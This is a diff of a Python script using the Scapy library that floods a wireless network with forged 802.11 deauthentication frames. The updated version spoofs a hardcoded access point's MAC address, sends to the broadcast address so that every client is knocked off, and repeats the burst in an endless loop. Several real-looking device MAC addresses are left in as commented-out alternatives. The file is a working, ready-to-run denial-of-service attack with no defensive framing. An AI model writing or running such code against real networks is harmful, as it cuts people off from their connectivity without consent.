@@ -1,25 +1,25 @@
 from scapy.all import *
 
-
 interface = 'wlp5s0mon'
-AP_MAC = '68:FF:7B:88:07:5C'
-Channel = 2
+# AP_MAC = '94:B4:0F:25:E4:61'
+AP_MAC = '68:ff:7b:88:07:5c'
+# AP_MAC = '9A:B8:BA:14:4A:54'
 target = '98:B8:BA:93:4A:54'
+# target = 'C0:E4:34:E1:1B:33'
+# target = 'AA:4F:A8:22:03:46'
+client_fake_MAC = 'FF:FF:FF:FF:FF:FF' # This is for AP Attack without CLient MAC Address
 
-def deauth_specific_victim():
+def deauth_specific_victim(Victim_MAC, AP_MAC):
     packet = RadioTap()/Dot11(addr1=target, addr2=AP_MAC, addr3=AP_MAC)/Dot11Deauth()
     return packet
 
-def deauth_ap():
-    packe_ap = RadioTap()/Dot11(addr1=AP_MAC, addr2=target, addr3=target)/Dot11Deauth()
+def deauth_ap(AP_MAC):
+    packe_ap = RadioTap()/Dot11(addr1=client_fake_MAC, addr2=AP_MAC, addr3=AP_MAC)/Dot11Deauth()
+    return packe_ap
 
-def attack_module():
-    pkt = deauth_specific_victim()
+def craft_deauth_attack():
+    pkt = deauth_ap(AP_MAC)
     sendp(pkt, iface = interface, count = 20, inter= .001)
 
-def main():
-    while True:
-        attack_module()
-
-for i in range(1, 100):
-    attack_module()
+while True:
+    craft_deauth_attack()
